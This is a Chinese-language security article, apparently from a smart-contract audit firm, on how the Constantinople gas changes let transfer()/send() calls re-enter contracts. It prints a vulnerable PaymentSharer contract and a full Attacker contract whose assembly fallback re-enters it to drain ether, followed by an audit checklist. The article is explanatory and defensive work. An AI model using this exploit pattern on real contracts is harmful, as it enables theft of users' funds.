>**了解智能合约审计和最佳实践请**[点击查看文档](https://safful.com/) 

# 以太坊硬分叉后的可重入漏洞攻击

以太坊君士坦丁堡升级将降低部分 SSTORE 指令的 gas 费用。然而，这次升级也有一个副作用，在 Solidity 语言编写的智能合约中调用 address.transfer()函数或 address.send()函数时存在可重入漏洞。在目前版本的以太坊网络中，这些函数被认为是可重入安全的，但分叉后它们不再是了。

# 这个代码的问题何在？

下图是君士坦丁堡硬分叉之前没有可重入漏洞的一个代码段，它会在分叉后导致可重入性。

```solidity
pragma solidity ^0.5.0;

contract PaymentSharer {
  mapping(uint => uint) splits;
  mapping(uint => uint) deposits;
  mapping(uint => address payable) first;
  mapping(uint => address payable) second;

  function init(uint id, address payable _first, address payable _second) public {
    require(first[id] == address(0) && second[id] == address(0));
    require(first[id] == address(0) && second[id] == address(0));
    first[id] = _first;
    second[id] = _second;
  }

  function deposit(uint id) public payable {
    deposits[id] += msg.value;
  }

  function updateSplit(uint id, uint split) public {
    require(split <= 100);
    splits[id] = split;
  }

  function splitFunds(uint id) public {
    // Here would be:
    // Signatures that both parties agree with this split

    // Split
    address payable a = first[id];
    address payable b = second[id];
    uint depo = deposits[id];
    deposits[id] = 0;

    a.transfer(depo * splits[id] / 100);
    b.transfer(depo * (100 - splits[id]) / 100);
  }
}
```

An example for newly vulnerable code.

这个代码会被一种意想不到的方式攻击：它模拟了一个安全的资金共享服务。双方可以共同接收资金，决定如何分成，如果他们达成一致 ­，则可以获得支付。攻击者将创建一个对，其中第一个地址是下图列出的攻击合约地址，第二个地址则是任何攻击者账户。攻击者将在这个对存入一些以太币。

```solidity
pragma solidity ^0.5.0;

import "./PaymentSharer.sol";

contract Attacker {
  address private victim;
  address payable owner;

  constructor() public {
    owner = msg.sender;
  }

  function attack(address a) external {
    victim = a;
    PaymentSharer x = PaymentSharer(a);
    x.updateSplit(0, 100);
    x.splitFunds(0);
  }

  function () payable external {
    address x = victim;
    assembly{
        mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
        pop(call(10000, x, 0, 0x80, 0x44, 0, 0))
    }
  }

  function drain() external {
    owner.transfer(address(this).balance);
  }
}
```

Attacker Contract listed as first address.

当攻击者在自己的合约中调用 attack 函数时，在同一个交易中就会发生以下事件：

1. 攻击者利用 updateSplit 函数设置当前的分成，从而确保之后的升级将会降低费用。这是君士坦丁堡升级带来的效应。攻击者通过这种方式设置分成，他的第一个地址（即攻击合约地址）就能接收到所有的以太币。
2. 攻击合约调用 splitFunds 函数，该调用将进行检查\*等，并通过 transfer()函数把其中存储的所有以太币发送到攻击合约。
3. 通过回退函数，攻击者再次执行分成，这一次将所有以太币分配给他的第二个地址，即其自己的账户。
4. 通过不断执行 splitFunds 函数，在第一个地址中存储的所有以太币都被转移到了攻击者账户中。
   _简单来说，攻击者可以不断从 PaymentSharer 合约中盗取其他用户的以太币。_

# 为什么这种漏洞变得可利用了？

在君士坦丁堡硬分叉前，一个存储指令至少需要 5000 gas 手续费。这远远超过了在利用 transfer()函数或 send()函数调用合约时可用的 2300 gas 津贴。
在君士坦丁堡分叉后，会改变“脏（dirty）”存储器槽（storage slot）的存储指令只需 200 gas。如果在交易执行期间对一个存储器槽做出修改，那么这个存储器槽就会被标记为“dirty”。如上所示，这可以通过在攻击合约调用一些改变所需变量的公共函数来实现。然后，通过使被攻击合约调用攻击合约，例如使用 msg.sender.transfer（…）函数，攻击合约就可以利用 gas 津贴成功操纵这个被攻击合约的变量。
被攻击合约必须满足以下先决条件：

1. 首先必须存在函数*A，在调用 transfer/send 函数后将执行状态修改的指令。有时这种指令可能是不明显的，例如，第二次 transfer 的调用或与另一个智能合约的互动。*
2. 必须存在攻击者可调用的函数*B* ，能够实现（a）改变状态；（b）其状态改变与函数*A*的状态改变冲突。
3. 执行函数*B* 的手续费必须小于 1600 gas （2300 gas 津贴 — CALL 指令花费的 700 gas）。

# 我的智能合约是否易受攻击？

要测试一个智能合约是否易受攻击：
(a) 检查在 transfer 事件后是否存在其他指令。
(b) 检查这些指令是否修改了存储状态。最常见的修改是通过分配一些存储变量。如果你在调用另一个合约，比如代币的 transfer 函数，检查并列出所有被修改的变量。
© 检查在你的合约中是否有任何非管理员可访问的方式使用了这些变量。
(d) 检查这些方式本身是否修改了存储状态。
(e) 检查这种方式的手续费是否低于 2300 gas，记住，SSTORE 指令理论上只需要花费 200 gas。
如果上述所有情况皆符合，那么攻击者很可能可以对你的合约发起恶意攻击，使其陷入糟糕的状态。总的来说，这也再次提醒了我们“检查-生效-交互”（Checks-Effects-Interactions）模式的重要性。

# 目前存在易受攻击的智能合约吗？

利用 eveem.org 提供的数据，我们检查了主要以太坊区块链，并未发现易受攻击的智能合约。我们也在与 ethsecurity.org 工作组的成员合作，将此次检查扩展到尚未反编译的复杂智能合约，尤其是去中心化交易所。去中心化交易所经常向不可信账户调用以太币转移函数，之后存储状态被修改，这些交易所就可能会变得易受攻击。请记住，在许多情况下，重入攻击警告并不意味着这个漏洞可以被利用，而需要更仔细的分析。
